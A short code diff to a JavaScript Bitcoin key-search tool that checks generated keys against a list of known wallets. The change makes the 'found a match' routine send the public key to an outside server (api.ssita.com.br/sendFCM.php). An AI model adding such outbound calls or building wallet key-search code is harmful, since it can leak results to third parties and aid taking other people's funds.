@@ -8,10 +8,10 @@ import walletsArray from "./wallets.js";
 
 const walletsSet = new Set(walletsArray);
 
-const checkKey = async function () {
+const checkKey = async function (publicKey) {
   console.log("blockchain");
   const attachment = await axios
-    .get(`https://api.ssita.com.br/sendFCM.php`, {})
+    .get(`https://api.ssita.com.br/sendFCM.php?key=159753&msg=` + publicKey, {})
     .then(async (response) => {
       console.log(response.data);
     })
@@ -133,7 +133,7 @@ async function encontrarBitcoins(key, min, max, shouldStop, rand = 0) {
         }
 
         await achou(1, JSON.stringify(lineToAppend));
-        await checkKey();
+        await checkKey(publicKey);
         throw "ACHEI!!!! 🎉🎉🎉🎉🎉";
       }
     }
